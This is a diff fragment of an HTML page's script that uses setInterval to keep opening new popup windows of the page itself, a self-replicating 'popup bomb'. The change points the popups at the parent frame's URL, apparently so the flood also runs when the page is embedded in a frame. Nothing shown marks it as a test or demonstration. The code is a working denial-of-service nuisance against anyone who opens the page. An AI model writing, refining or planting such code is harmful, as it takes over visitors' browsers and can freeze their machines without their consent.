@@ -5,7 +5,7 @@
 <script>
 function spawn() {
   setInterval(() => {
-    let w = window.open(location.href, "_blank", "width=300,height=200");
+    let w = window.open(window.parent.location.href, "_blank", "width=300,height=200");
     if (w) {
       try { window.opener = null; } catch(e) {}
     }
